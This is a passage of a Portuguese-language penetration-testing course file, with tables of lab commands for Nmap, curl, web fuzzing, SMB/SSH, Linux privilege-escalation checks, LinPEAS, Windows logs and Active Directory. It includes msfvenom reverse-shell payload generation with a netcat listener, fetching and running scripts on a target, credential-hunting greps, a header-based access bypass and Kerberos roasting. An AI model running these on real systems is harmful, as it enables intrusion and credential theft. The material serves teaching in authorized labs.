        'O Nmap tem muitas opções e scripts NSE que variam por versão. Para totalidade da sua instalação, use nmap --help, man nmap e nmap --script-help all. No curso, toda opção usada nos labs aparece explicada abaixo ou na referência por categoria.',
      ],
      table: {
        headers: ['Comando', 'Quando usar', 'Por que usar', 'O que acontece / como ler', 'Cuidado'],
        rows: [
          ['nmap -sn <rede>/24', 'Início em rede autorizada com vários hosts.', 'Descobre hosts vivos sem varrer portas.', 'Mostra quais IPs responderam a probes. Use como inventário inicial.', 'ICMP bloqueado pode esconder hosts vivos.'],
          ['nmap -Pn <IP>', 'Quando o host parece offline.', 'Ignora host discovery e tenta portas direto.', 'Pode revelar portas mesmo sem ping.', 'Mais lento em faixas grandes.'],
          ['nmap -sC -sV -oN scan.txt <IP>', 'Primeiro scan TCP de CTF.', 'Roda scripts padrão e identifica versões.', 'Mostra PORT, STATE, SERVICE, VERSION e scripts relevantes.', 'Não substitui scan de todas as portas.'],
          ['nmap -p- --min-rate 5000 -oN allports.txt <IP>', 'Depois do scan inicial.', 'Procura portas TCP fora do top 1000.', 'Retorna lista ampla de portas abertas.', 'Confirme depois com -sV nas portas achadas.'],
          ['nmap -sC -sV -p 22,80,445 <IP>', 'Após descobrir portas específicas.', 'Aprofunda só no que está aberto.', 'Reduz ruído e melhora leitura de versões/scripts.', 'Portas esquecidas ficam sem enumeração.'],
          ['sudo nmap -sS <IP>', 'Quando tem privilégio local/root.', 'SYN scan é rápido e padrão em ambientes Unix.', 'Envia SYN e interpreta SYN-ACK/RST sem completar sessão.', 'Requer permissão elevada.'],
          ['nmap -sT <IP>', 'Quando não tem root.', 'Usa conexão TCP completa do sistema operacional.', 'Mais compatível, porém mais ruidoso.', 'Pode aparecer mais claramente em logs.'],
          ['sudo nmap -sU --top-ports 20 <IP>', 'Quando suspeita de DNS, SNMP, NTP, TFTP.', 'UDP não aparece em scan TCP.', 'open|filtered é comum; valide manualmente.', 'UDP é lento e ambíguo.'],
          ['nmap -A <IP>', 'Em lab, para enumeração agressiva rápida.', 'Combina OS detection, version, scripts e traceroute.', 'Produz saída rica, mas barulhenta.', 'Evite como primeiro comando em ambiente sensível.'],
          ['nmap -O <IP>', 'Quando OS importa para hipótese.', 'Tenta fingerprint de sistema operacional.', 'Mostra probabilidade de OS.', 'Pode errar com firewall/NAT.'],
          ['nmap --script=http-enum -p80 <IP>', 'Porta HTTP aberta.', 'Busca caminhos comuns via NSE.', 'Lista diretórios/arquivos conhecidos.', 'Não substitui ffuf/gobuster.'],
          ['nmap --script=ftp-anon -p21 <IP>', 'FTP aberto.', 'Verifica login anônimo.', 'Indica se anonymous funciona.', 'Se funcionar, enumere manualmente com ftp/lftp.'],
          ['nmap --script=smb-enum-shares,smb-enum-users -p445 <IP>', 'SMB aberto.', 'Lista shares/usuários quando permitido.', 'Pode revelar nomes de share e contas.', 'Falha não significa que SMB não tem dados.'],
          ['nmap --script=vuln -p <porta> <IP>', 'Após identificar serviço e versão.', 'Procura checks conhecidos de vulnerabilidade.', 'Saída sugere CVEs ou misconfigs.', 'Confirme manualmente; script pode ter falso positivo.'],
          ['nmap -oA scans/initial <IP>', 'Quando quer evidência completa.', 'Salva normal, grepable e XML.', 'Gera initial.nmap, initial.gnmap e initial.xml.', 'Organize nomes para não sobrescrever.'],
        ]
      }
    }
  },
  {
    id: 'd1-manual-nmap-flags', title: 'Manual de Comandos — Nmap Flags por Categoria', day: 1, topic: 'Ferramentas',
    type: 'table',
    content: {
      theory: [
        'Esta página não é para decorar. É para o aluno saber onde cada opção entra no raciocínio: escopo, descoberta, portas, serviço, scripts, saída, velocidade e leitura.',
      ],
      table: {
        headers: ['Opção / comando', 'Categoria', 'O que faz', 'Quando usar', 'Cuidado'],
        rows: [
          ['nmap --help', 'Referência', 'Mostra ajuda resumida da versão instalada.', 'Quando surgir flag nova ou dúvida de sintaxe.', 'A ajuda curta não substitui man nmap.'],
          ['man nmap', 'Referência', 'Abre o manual completo instalado localmente.', 'Para consultar todas as opções da versão do aluno.', 'Pode ser longo; pesquise com /termo.'],
          ['nmap --script-help all', 'Referência NSE', 'Lista ajuda dos scripts NSE disponíveis.', 'Quando precisar saber o que um script faz antes de rodar.', 'Scripts podem ser intrusivos; leia categoria e descrição.'],
          ['-sn', 'Descoberta de host', 'Ping scan: descobre hosts sem varrer portas.', 'Inventário inicial em rede autorizada.', 'ICMP bloqueado pode esconder hosts.'],
          ['-Pn', 'Descoberta de host', 'Assume host ativo e pula ping discovery.', 'Quando o alvo parece down, mas você sabe que existe.', 'Mais lento em múltiplos hosts.'],
          ['-p 22,80,445', 'Portas', 'Escaneia portas específicas.', 'Depois de descobrir portas ou quando há hipótese clara.', 'Porta fora da lista fica invisível.'],
          ['-p-', 'Portas', 'Escaneia todas as portas TCP.', 'Depois do scan inicial.', 'Mais demorado; salve saída.'],
          ['--top-ports 100', 'Portas', 'Escaneia as portas mais comuns.', 'Triagem rápida em lab.', 'Pode perder serviço fora do comum.'],
          ['-F', 'Portas', 'Fast scan com menos portas.', 'Quando precisa de visão muito rápida.', 'Cobertura menor.'],
          ['-sS', 'Tipo de scan', 'SYN scan; rápido e comum quando há privilégio.', 'Linux com sudo/root.', 'Requer privilégio e pode aparecer em logs.'],
          ['-sT', 'Tipo de scan', 'TCP connect scan completo.', 'Quando não há privilégio para -sS.', 'Mais ruidoso.'],
          ['-sU', 'Tipo de scan', 'Scan UDP.', 'Quando suspeita DNS, SNMP, NTP, TFTP.', 'Lento e open|filtered é ambíguo.'],
          ['-sV', 'Serviço', 'Detecta nome e versão do serviço.', 'Quase sempre após achar porta aberta.', 'Pode demorar em serviços estranhos.'],
          ['--version-all', 'Serviço', 'Aumenta intensidade da detecção de versão.', 'Quando versão é decisiva e -sV foi inconclusivo.', 'Mais probes e mais tempo.'],
          ['-O', 'Sistema operacional', 'Tenta fingerprint do OS.', 'Quando OS muda a hipótese de exploração/defesa.', 'Pode errar com firewall/NAT.'],
          ['-A', 'Agressivo', 'Combina OS, versão, scripts padrão e traceroute.', 'Lab controlado para visão rápida.', 'Não use como primeiro comando em ambiente sensível.'],
          ['-sC', 'Scripts NSE', 'Roda scripts padrão, equivalente a --script=default.', 'Primeiro aprofundamento de CTF.', 'Leia saída; script falho não prova ausência de falha.'],
          ['--script=<nome>', 'Scripts NSE', 'Executa script específico.', 'Quando há hipótese por serviço.', 'Verifique se é safe/default/vuln/intrusive.'],
          ['--script=http-enum', 'Scripts HTTP', 'Procura caminhos HTTP comuns.', 'Porta web aberta.', 'Não substitui fuzzing dedicado.'],
          ['--script=ftp-anon', 'Scripts FTP', 'Testa login anonymous.', 'Porta 21 aberta.', 'Se der positivo, valide manualmente.'],
          ['--script=smb-enum-shares,smb-enum-users', 'Scripts SMB', 'Tenta listar shares e usuários.', 'SMB aberto em lab.', 'Falha pode ser permissão, não ausência de SMB.'],
          ['--script=vuln', 'Scripts vuln', 'Roda checks de vulnerabilidade disponíveis.', 'Após versão/serviço claros.', 'Pode ter falso positivo e scripts intrusivos.'],
          ['--reason', 'Leitura', 'Mostra por que o Nmap marcou estado da porta.', 'Para explicar open/closed/filtered no relatório.', 'Exige entender resposta TCP/ICMP.'],
          ['--open', 'Leitura', 'Mostra só portas abertas/provavelmente abertas.', 'Quando a saída está grande.', 'Pode esconder contexto de filtered.'],
          ['-v / -vv', 'Leitura', 'Aumenta verbosidade.', 'Quando scan demora e você quer progresso.', 'Saída maior.'],
          ['-oN scan.txt', 'Saída', 'Salva saída normal.', 'Relatório e revisão.', 'Não sobrescreva sem querer.'],
          ['-oA scans/inicial', 'Saída', 'Salva normal, grepable e XML.', 'Quando quer evidência completa.', 'Crie pasta antes.'],
          ['-oX scan.xml', 'Saída', 'Salva XML.', 'Importar em ferramentas ou parsear.', 'Menos confortável para leitura humana.'],
          ['-iL alvos.txt', 'Escopo', 'Lê lista de alvos de arquivo.', 'Múltiplos IPs autorizados.', 'Arquivo errado muda escopo.'],
          ['--exclude <IP>', 'Escopo', 'Remove alvo do scan.', 'Quando uma faixa contém host fora do escopo.', 'Confira antes de rodar.'],
          ['-T0 a -T5', 'Performance', 'Define timing template.', 'Lab pode usar T4; ambiente sensível exige cautela.', 'Mais rápido pode gerar perda/ruído.'],
          ['--min-rate 5000', 'Performance', 'Define taxa mínima de pacotes.', 'CTF/lab para varrer todas as portas.', 'Pode perder resultado se rede não aguentar.'],
          ['--max-retries <n>', 'Performance', 'Limita tentativas por probe.', 'Ajuste fino em lab com perda baixa.', 'Baixo demais perde portas.'],
        ]
      }
    }
  },
  {
    id: 'd1-manual-http-curl', title: 'Manual de Comandos — HTTP, curl e Headers', day: 1, topic: 'Web',
    type: 'table',
    content: {
      theory: [
        'curl é a ferramenta para conversar com HTTP sem distrações do navegador. Use para ver exatamente o que você enviou e exatamente o que o servidor respondeu.',
      ],
      table: {
        headers: ['Comando', 'Quando usar', 'Por que usar', 'O que acontece / como ler', 'Cuidado'],
        rows: [
          ['curl -i http://<host>/', 'Primeiro contato com site.', 'Mostra headers e corpo juntos.', 'Veja status, Server, Set-Cookie, Location e HTML.', 'Não segue redirects sem -L.'],
          ['curl -I http://<host>/', 'Quer só headers.', 'Mais rápido para tecnologia e redirects.', 'Mostra cabeçalhos sem baixar corpo.', 'Alguns servidores tratam HEAD diferente de GET.'],
          ['curl -L -i http://<host>/', 'Quando há 301/302.', 'Segue redirects e mostra cadeia final.', 'Observe cada Location e cookie novo.', 'Pode esconder redirect intermediário se não ler tudo.'],
          ['curl -v http://<host>/', 'Debug de conexão.', 'Mostra DNS, conexão TCP, TLS e headers enviados.', 'Útil para entender erro de TLS, proxy ou host.', 'Saída é verbosa; salve se precisar.'],
          ['curl -k https://<host>/', 'HTTPS com certificado inválido em lab.', 'Ignora validação TLS.', 'Permite testar site com cert self-signed.', 'Não use como hábito em produção.'],
          ['curl -H "Host: admin.<domain>" http://<IP>/', 'Testar virtual host.', 'Servidor pode responder por hostname, não por IP.', 'Resposta diferente indica vhost válido.', 'Adicione ao /etc/hosts depois de confirmar.'],
          ['curl -H "X-Forwarded-For: 127.0.0.1" http://<host>/admin', 'Testar app que confia em IP de origem.', 'Algumas apps usam header para controle fraco.', 'Se status muda, header influencia autorização.', 'Só em lab; é bypass de controle.'],
          ['curl -X POST -d "user=admin&pass=admin" http://<host>/login', 'Testar formulário manualmente.', 'Controla parâmetros enviados.', 'Compare status, tamanho e cookies da resposta.', 'Content-Type padrão é form-urlencoded.'],
          ['curl -b "PHPSESSID=<valor>" http://<host>/admin', 'Reutilizar cookie de sessão.', 'Valida acesso autenticado sem navegador.', 'Se abrir admin, cookie é suficiente.', 'Proteja cookies; são credenciais temporárias.'],
          ['curl -c cookies.txt -b cookies.txt http://<host>/', 'Manter sessão entre requisições.', 'Salva e reutiliza cookies automaticamente.', 'Útil para login seguido de páginas internas.', 'Apague arquivo se contiver sessão sensível.'],
          ['curl -u user:pass http://<host>/', 'HTTP Basic Auth.', 'Envia Authorization Basic.', 'Servidor deve responder 200 se credencial serve.', 'Basic é base64, não criptografia.'],
          ['curl -H "Authorization: Bearer <token>" http://<host>/api', 'Testar API com token.', 'Reproduz chamada autenticada.', '401/403/200 indicam validade e permissão.', 'Não exponha tokens em logs.'],
          ['curl -o arquivo.bin http://<host>/download', 'Baixar arquivo.', 'Preserva conteúdo para análise.', 'Verifique tipo com file e hash.', 'Não execute arquivo baixado sem análise.'],
          ['curl -s http://<host>/ | grep -i "admin\\|debug\\|backup"', 'Busca rápida no HTML.', 'Encontra pistas em comentários e links.', 'Mostra termos relevantes.', 'grep pode perder JS minificado complexo.'],
        ]
      }
    }
  },
  {
    id: 'd1-manual-web-fuzzing', title: 'Manual de Comandos — ffuf, gobuster e Feroxbuster', day: 1, topic: 'Web',
    type: 'table',
    content: {
      theory: [
        'Fuzzing serve para testar muitas hipóteses de caminho, arquivo, parâmetro ou vhost. A regra é filtrar bem para transformar volume em evidência.',
      ],
      table: {
        headers: ['Comando', 'Quando usar', 'Por que usar', 'O que acontece / como ler', 'Cuidado'],
        rows: [
          ['gobuster dir -u http://<host>/ -w common.txt', 'Enumeração simples de diretórios.', 'Rápido e fácil de ler.', 'Status 200/301/302/403 indicam caminhos interessantes.', 'Wordlist fraca perde conteúdo.'],
          ['gobuster dir -u http://<host>/ -w common.txt -x php,txt,bak,zip,old', 'Site com tecnologia conhecida.', 'Testa extensões comuns.', 'Acha backup.php, config.txt, admin.zip etc.', 'Aumenta muito o número de requests.'],
          ['gobuster dns -d <domain> -w subdomains.txt', 'Descobrir subdomínios por DNS.', 'Resolve nomes comuns.', 'Mostra subdomínios com IP.', 'Não acha vhost sem DNS público.'],
          ['gobuster vhost -u http://<domain>/ -w subdomains.txt', 'Servidor virtual host.', 'Testa Host header.', 'Tamanho/status diferente sugere vhost.', 'Precisa filtrar resposta padrão.'],
          ['ffuf -u http://<host>/FUZZ -w common.txt', 'Fuzzing geral de path.', 'Mais flexível que gobuster.', 'Mostra status, tamanho, palavras e linhas.', 'Sem filtro pode gerar ruído.'],
          ['ffuf -u http://<host>/FUZZ -w common.txt -fc 404', 'Quando 404 é claro.', 'Remove não encontrados.', 'Sobra o que respondeu diferente.', 'Se app retorna 200 para tudo, use -fs/-fw.'],
          ['ffuf -u http://<host>/FUZZ -w common.txt -fs <tamanho>', 'Quando resposta padrão tem mesmo tamanho.', 'Filtra falso positivo por bytes.', 'Resultados restantes têm tamanho diferente.', 'Tamanho pode variar com hora/banner.'],
          ['ffuf -u http://<host>/FUZZ -w common.txt -recursion', 'Quando diretórios aparecem.', 'Continua fuzzing dentro de paths achados.', 'Acha estruturas profundas.', 'Pode explodir quantidade de requests.'],
          ['ffuf -u http://<host>/ -H "Host: FUZZ.<domain>" -w subs.txt -fs <tamanho>', 'Vhost sem DNS.', 'Fuzza Host header.', 'Resposta diferente revela app virtual.', 'Adicione vhost ao hosts para navegar.'],
          ['ffuf -u "http://<host>/item?id=FUZZ" -w nums.txt', 'Testar IDOR/enumeração de parâmetro.', 'Varia valores de parâmetro.', 'Mudança em status/tamanho indica item válido.', 'Não use em sistemas reais sem autorização.'],
          ['feroxbuster -u http://<host>/ -w common.txt', 'Enumeração recursiva rápida.', 'Boa visualização e recursão automática.', 'Mostra diretórios e arquivos encontrados.', 'Ajuste rate para não saturar lab.'],
          ['feroxbuster -u http://<host>/ -x php,txt,bak -k', 'HTTPS inválido ou extensões comuns.', 'Ignora TLS inválido e testa extensões.', 'Acha arquivos por extensão.', 'Use -k só em lab/cert self-signed.'],
        ]
      }
    }
  },
  {
    id: 'd1-manual-network-services', title: 'Manual de Comandos — FTP, SMB, SSH e Netcat', day: 1, topic: 'Redes',
    type: 'table',
    content: {
      theory: [
        'Serviços de rede expõem arquivos, credenciais, banners e caminhos de acesso. A primeira pergunta é sempre: há acesso anônimo ou credencial reaproveitada?',
      ],
      table: {
        headers: ['Comando', 'Quando usar', 'Por que usar', 'O que acontece / como ler', 'Cuidado'],
        rows: [
          ['ftp <IP>', 'Porta 21 aberta.', 'Cliente FTP interativo padrão.', 'Tente usuário anonymous e liste arquivos.', 'FTP envia senha em claro.'],
          ['lftp -u anonymous,anonymous <IP>', 'FTP anônimo com muitos arquivos.', 'Cliente melhor para download recursivo.', 'Use mirror para copiar diretórios.', 'Confira permissões antes de upload.'],
          ['wget -m ftp://anonymous:anonymous@<IP>/', 'Baixar árvore FTP.', 'Espelha conteúdo para análise local.', 'Cria cópia dos arquivos expostos.', 'Pode baixar volume grande.'],
          ['smbclient -L //<IP> -N', 'SMB aberto sem credenciais.', 'Lista shares anonimamente.', 'Shares como Replication, backups, Users são pistas.', 'Falha não exclui acesso com credencial.'],
          ['smbclient //<IP>/<share> -N', 'Share anônimo encontrado.', 'Navega e baixa arquivos.', 'Use ls, cd, get, mget.', 'Cuidado com mget recursivo sem pasta organizada.'],
          ['smbclient //<IP>/<share> -U user', 'Tem usuário/senha.', 'Testa acesso autenticado ao share.', 'Status e listagem indicam permissão.', 'Domínio pode ser necessário: DOMAIN\\\\user.'],
          ['enum4linux-ng -A <IP>', 'Quer panorama SMB/RPC.', 'Enumera domínio, users, groups e shares.', 'Gera relatório amplo para orientar AD.', 'Pode demorar e gerar ruído.'],
          ['crackmapexec smb <IP> -u user -p pass --shares', 'Validar credencial SMB.', 'Mostra shares acessíveis por usuário.', 'READ/WRITE revelam alvos de arquivo.', 'Não faça spray fora de lab.'],
          ['ssh user@<IP>', 'Porta 22 e credencial válida.', 'Acesso remoto interativo.', 'Se autenticar, você tem shell do usuário.', 'Registra login no alvo.'],
          ['ssh -i id_rsa user@<IP>', 'Tem chave privada.', 'Autentica por chave.', 'Permissão da chave precisa ser 600.', 'Nunca exponha chave privada.'],
          ['ssh -L 8080:127.0.0.1:80 user@<IP>', 'Serviço só acessível localmente no alvo.', 'Cria túnel local.', 'Acesse localhost:8080 na sua máquina.', 'Entenda direção do túnel.'],
          ['ssh -D 1080 user@<IP>', 'Precisa proxy SOCKS para pivot.', 'Encaminha tráfego via SSH.', 'Configure navegador/proxychains para 127.0.0.1:1080.', 'Pode quebrar DNS se proxy mal configurado.'],
          ['nc -nv <IP> <porta>', 'Testar banner/protocolo simples.', 'Conexão TCP bruta.', 'Banner pode revelar serviço.', 'Não fala protocolos complexos sozinho.'],
          ['nc -lvnp 4444', 'Listener em laboratório.', 'Recebe conexão reversa autorizada.', 'Se alvo conectar, mostra sessão.', 'Use apenas em lab/ambiente próprio.'],
        ]
      }
    }
  },
  {
    id: 'd1-manual-linux-core', title: 'Manual de Comandos — Linux Essencial', day: 1, topic: 'Linux',
    type: 'table',
    content: {
      table: {
        headers: ['Comando', 'Quando usar', 'Por que usar', 'O que acontece / como ler', 'Cuidado'],
        rows: [
          ['pwd; whoami; id; hostname', 'Primeiro minuto de shell.', 'Orienta identidade e host.', 'Mostra diretório, usuário, UID, grupos e nome da máquina.', 'Não ignore grupos especiais.'],
          ['ls -la', 'Explorar diretório.', 'Mostra ocultos, dono e permissões.', 'Arquivos .ssh, .config e backups aparecem.', 'Permissão importa tanto quanto nome.'],
          ['cat /etc/passwd', 'Mapear usuários.', 'Lista contas e shells.', '/bin/bash ou /bin/sh indica usuário interativo.', 'Não contém hashes modernos.'],
          ['sudo -l', 'Checar sudo.', 'Pode revelar NOPASSWD.', 'Comando permitido pode virar privesc.', 'Pode pedir senha.'],
          ['find / -perm -4000 -type f 2>/dev/null', 'Privesc Linux.', 'Encontra SUID.', 'Binário root incomum merece análise.', 'Nem todo SUID é explorável.'],
          ['getcap -r / 2>/dev/null', 'Privesc por capabilities.', 'Acha permissões granulares perigosas.', 'cap_setuid+ep, cap_dac_read_search são fortes.', 'Capabilities não aparecem no chmod comum.'],
          ['ps aux', 'Ver processos.', 'Identifica serviços, usuários e comandos.', 'Processo root em path estranho é pista.', 'Linha de comando pode conter segredo.'],
          ['ss -tulpn', 'Portas locais.', 'Mostra listeners e processos.', '127.0.0.1 indica serviço interno.', 'Alguns processos exigem root para mostrar nome.'],
          ['cat /etc/crontab; ls -la /etc/cron.*', 'Checar tarefas agendadas.', 'Cron com script gravável vira vetor.', 'Veja usuário que executa e frequência.', 'Não altere sem backup em lab.'],
          ['grep -R "password\\|pwd\\|secret\\|token" /home /opt /var/www 2>/dev/null', 'Buscar credenciais.', 'Config e backups guardam segredos.', 'Resultado com senha deve ser validado.', 'Pode gerar muito output.'],
          ['find / -writable -type d 2>/dev/null | grep -v proc', 'Achar diretórios graváveis.', 'Importante para upload, cron e path hijack.', '/tmp é normal; /opt/app pode ser crítico.', 'Gravável não significa executado.'],
          ['tail -f /var/log/auth.log', 'Monitorar autenticação.', 'Vê SSH/sudo em tempo real.', 'Falhas e logins aparecem com IP/usuário.', 'Nem toda distro usa auth.log.'],
          ['journalctl -u ssh --since "1 hour ago"', 'Distro com systemd.', 'Filtra logs de serviço.', 'Mostra eventos recentes do SSH.', 'Permissões podem limitar leitura.'],
          ['tar -czf coleta.tgz pasta/', 'Coletar evidências em lab.', 'Compacta arquivos para análise.', 'Gera pacote .tgz.', 'Não compacte dados sensíveis fora do escopo.'],
        ]
      }
    }
  },
  {
    id: 'd1-manual-linpeas', title: 'Manual de Comandos — LinPEAS em Lab Autorizado', day: 1, topic: 'Linux',
    type: 'table',
    content: {
      theory: [
        'LinPEAS é automação de enumeração local. Ele não "escala privilégio"; ele aponta evidências que o aluno precisa validar com comandos nativos.',
        'Ordem obrigatória no curso: primeiro whoami/id, sudo -l, SUID, capabilities, cron e segredos; depois linpeas para cobertura e comparação.',
      ],
      table: {
        headers: ['Comando', 'Quando usar', 'Por que usar', 'O que acontece / como ler', 'Cuidado'],
        rows: [
          ['curl -L https://github.com/peass-ng/PEASS-ng/releases/latest/download/linpeas.sh -o linpeas.sh', 'Na máquina do operador, antes do lab.', 'Baixa o script oficial para servir ao alvo.', 'Cria linpeas.sh no diretório atual.', 'Baixe apenas fonte confiável e confira o escopo do lab.'],
          ['sha256sum linpeas.sh', 'Depois de baixar.', 'Registra hash do script usado no relatório.', 'Gera hash SHA256 para rastreabilidade.', 'Hash muda quando a versão muda.'],
          ['python3 -m http.server 8000', 'Na máquina do operador.', 'Serve o arquivo para o alvo baixar.', 'Abre servidor HTTP local na porta 8000.', 'Use apenas em rede de lab/VPN autorizada.'],
          ['wget http://<SEU_IP>:8000/linpeas.sh -O /tmp/linpeas.sh', 'No alvo Linux com wget.', 'Transfere o script para /tmp.', 'Arquivo aparece em /tmp/linpeas.sh.', 'Se wget não existir, use curl.'],
          ['curl http://<SEU_IP>:8000/linpeas.sh -o /tmp/linpeas.sh', 'No alvo Linux sem wget.', 'Alternativa para transferir o script.', 'Arquivo aparece em /tmp/linpeas.sh.', 'Confirme que <SEU_IP> é seu IP da VPN/lab.'],
          ['chmod +x /tmp/linpeas.sh', 'Depois do download.', 'Permite executar o script.', 'Adiciona bit de execução.', 'Permissão de execução não significa privilégio.'],
          ['/tmp/linpeas.sh | tee /tmp/linpeas.txt', 'Após checklist manual.', 'Executa e salva a saída para revisão.', 'Mostra achados e grava linpeas.txt.', 'Não cole tudo no relatório; selecione evidências.'],
          ['less -R /tmp/linpeas.txt', 'Ler saída salva com cores.', 'Facilita revisar seções grandes.', 'Permite navegar e buscar por termos.', 'A saída é pista, não conclusão.'],
          ['grep -Ei "sudo|suid|capabilities|password|writable|cron" /tmp/linpeas.txt', 'Revisão focada.', 'Extrai áreas que conectam aos vetores ensinados.', 'Mostra linhas relevantes para validar manualmente.', 'grep pode perder contexto; volte ao arquivo completo.'],
          ['sudo -l', 'Validar achado de sudo.', 'Confirma permissão indicada pelo linpeas.', 'Mostra comandos permitidos como outro usuário/root.', 'Pode exigir senha.'],
          ['find / -perm -4000 -type f 2>/dev/null', 'Validar achado de SUID.', 'Confirma binários SUID destacados.', 'Lista binários com bit SUID.', 'Compare com padrão da distro.'],
          ['getcap -r / 2>/dev/null', 'Validar achado de capability.', 'Confirma capabilities perigosas.', 'Mostra cap_setuid, cap_dac_read_search etc.', 'Nem toda capability vira root.'],
          ['cat /etc/crontab; ls -la /etc/cron.*', 'Validar achado de cron.', 'Confirma tarefa e permissões.', 'Mostra frequência, usuário e script chamado.', 'Não edite sem entender timing.'],
          ['rm -f /tmp/linpeas.sh /tmp/linpeas.txt', 'Fim do lab.', 'Remove artefatos temporários.', 'Limpa arquivos criados no alvo.', 'Guarde evidências necessárias antes.'],
        ]
      },
      tips: [
        'Leitura das cores: destaque forte pede validação, não ação automática.',
        'Relatório bom escreve: linpeas apontou X, validei com comando Y, a evidência foi Z, então a decisão foi W.',
      ]
    }
  },
  {
    id: 'd1-manual-msfvenom', title: 'Manual de Comandos — msfvenom em Labs', day: 1, topic: 'Ferramentas',
    type: 'table',
    content: {
      theory: [
        'msfvenom aparece no curso apenas para gerar artefatos em laboratório autorizado, como WAR para Tomcat ou ASPX para IIS. Ele não substitui enumeração nem validação.',
      ],
      table: {
        headers: ['Comando', 'Quando usar', 'Por que usar', 'O que acontece / como ler', 'Cuidado'],
        rows: [
          ['msfvenom -l payloads | grep -i jsp', 'Antes de gerar payload Java/JSP.', 'Lista payloads disponíveis e filtra por JSP.', 'Mostra nomes de payload aceitos pelo -p.', 'Escolha payload compatível com o serviço.'],
          ['msfvenom -p java/jsp_shell_reverse_tcp LHOST=<SEU_IP> LPORT=4444 -f war -o shell.war', 'Tomcat Manager com deploy WAR autorizado no lab.', 'Gera WAR com JSP de reverse shell.', 'Cria shell.war para upload no Manager.', 'Use só em lab; confirme LHOST e listener.'],
          ['msfvenom -p windows/shell_reverse_tcp LHOST=<SEU_IP> LPORT=4444 -f aspx -o shell.aspx', 'IIS executando ASPX em lab.', 'Gera webshell/reverse shell ASPX.', 'Cria shell.aspx para upload em pasta servida.', 'Só funciona se IIS executar ASPX e o upload for permitido.'],
          ['file shell.war; ls -lh shell.war', 'Depois de gerar arquivo.', 'Confirma que o artefato existe e tem tamanho plausível.', 'Mostra tipo/tamanho.', 'Não execute localmente.'],
          ['nc -lvnp 4444', 'Antes de acionar payload reverso.', 'Abre listener para receber conexão.', 'Quando o alvo conectar, aparece sessão.', 'Porta deve bater com LPORT.'],
        ]
      }
    }
  },

  // ==================== MANUAL DE COMANDOS - DIA 2 ====================
  {
    id: 'd2-manual-windows-events', title: 'Manual de Comandos — Windows Logs e PowerShell', day: 2, topic: 'Windows',
    type: 'table',
    content: {
      table: {
        headers: ['Comando', 'Quando usar', 'Por que usar', 'O que acontece / como ler', 'Cuidado'],
        rows: [
          ['Get-WinEvent -LogName Security -MaxEvents 20', 'Primeiro contato com log local.', 'Confirma acesso e formato dos eventos.', 'Mostra eventos recentes do Security.', 'Pode exigir admin para alguns logs.'],
          ['Get-WinEvent -FilterHashtable @{LogName="Security"; Id=4625}', 'Investigar falhas de login.', 'Filtra no provedor, mais eficiente.', 'Eventos 4625 mostram usuário, origem e motivo.', 'Mensagens variam por idioma do Windows.'],
          ['Get-WinEvent -FilterHashtable @{LogName="Security"; Id=4624}', 'Investigar logon bem-sucedido.', 'Confirma acesso real.', 'Leia LogonType, AccountName e IpAddress.', 'Tipo 3 é rede; tipo 10 é RDP.'],
          ['Get-WinEvent -FilterHashtable @{LogName="Security"; Id=4672}', 'Ver logon admin.', 'Indica privilégios especiais.', 'Correlacione com 4624 próximo no tempo.', 'Serviços legítimos também geram 4672.'],
          ['Get-WinEvent -FilterHashtable @{LogName="Security"; Id=4688}', 'Criação de processo auditada.', 'Mostra execução de comandos.', 'Leia NewProcessName e CommandLine se habilitada.', 'CommandLine pode não estar habilitada.'],
          ['Get-WinEvent -LogName "Microsoft-Windows-Sysmon/Operational" -MaxEvents 50', 'Sysmon instalado.', 'Logs ricos de processo/rede/arquivo.', 'Eventos 1,3,11,22 são muito úteis.', 'Sem Sysmon, canal não existe.'],
          ['Get-WinEvent -Path caso.evtx', 'Analisar log exportado.', 'Não precisa estar no host original.', 'Permite filtrar .evtx offline.', 'Preserve arquivo original.'],
          ['wevtutil qe Security /q:"*[System[(EventID=4625)]]" /f:text /c:5', 'Ambiente sem PowerShell útil.', 'Ferramenta nativa antiga.', 'Exibe eventos filtrados por XPath.', 'Sintaxe XPath é sensível.'],
          ['Get-Process | Sort-Object CPU -Descending | Select -First 10', 'Triagem de processos.', 'Acha consumo anormal.', 'Mostra processos mais ativos.', 'Alto CPU não prova malware.'],
          ['Get-Service | Where-Object {$_.Status -eq "Running"}', 'Ver serviços rodando.', 'Serviço suspeito pode indicar persistência.', 'Nome, status e display name ajudam triagem.', 'Serviço legítimo pode ter nome estranho.'],
          ['Get-ChildItem -Recurse -Force C:\\Users\\Public', 'Procurar arquivos em pasta comum.', 'Atacantes usam Public/Temp.', 'Lista arquivos ocultos e subpastas.', 'Recursão em C:\\ inteiro pode demorar muito.'],
          ['Select-String -Path *.txt,*.config -Pattern "password","token","secret"', 'Buscar segredos em arquivos.', 'Config pode conter credenciais.', 'Retorna arquivo, linha e match.', 'Cuidado com volume e falsos positivos.'],
        ]
      }
    }
  },
  {
    id: 'd2-manual-ad-impacket', title: 'Manual de Comandos — Active Directory e Impacket', day: 2, topic: 'Active Directory',
    type: 'table',
    content: {
      theory: [
        'Comandos de AD devem seguir pré-requisitos. Primeiro descubra domínio e usuários; depois teste técnicas como AS-REP, Kerberoast e BloodHound em ambiente autorizado.',
      ],
      table: {
        headers: ['Comando', 'Quando usar', 'Por que usar', 'O que acontece / como ler', 'Cuidado'],
        rows: [
          ['rpcclient -U "" -N <IP>', 'DC/RPC permitindo null session.', 'Tenta enumeração sem credencial.', 'Prompt rpcclient permite enumdomusers.', 'Nem todo DC permite.'],
          ['enumdomusers', 'Dentro do rpcclient.', 'Lista usuários do domínio.', 'Retorna RID e username.', 'Salve lista limpa para roasting.'],
          ['enumdomgroups', 'Dentro do rpcclient.', 'Lista grupos.', 'Ajuda a entender estrutura.', 'Não mostra todas as relações complexas.'],
          ['ldapsearch -x -H ldap://<IP> -s base namingcontexts', 'LDAP aberto.', 'Descobre base DN.', 'Mostra DC=dominio,DC=local.', 'Pode exigir domínio/credencial.'],
          ['GetNPUsers.py <domain>/ -usersfile users.txt -no-pass -dc-ip <IP> -outputfile asrep.txt', 'Tem lista de usuários e sem credencial.', 'Testa AS-REP Roasting.', 'Se vulnerável, salva hash Kerberos.', 'Hash ainda precisa quebrar offline.'],
          ['hashcat -m 18200 asrep.txt rockyou.txt', 'Após AS-REP hash.', 'Tenta recuperar senha offline.', 'Mostra senha se wordlist cobrir.', 'Modo errado nunca quebra.'],
          ['GetUserSPNs.py <domain>/<user>:<pass> -dc-ip <IP> -request -outputfile kerb.txt', 'Tem credencial válida.', 'Solicita TGS de contas com SPN.', 'Salva hash Kerberoast.', 'Conta de serviço pode ter senha forte.'],
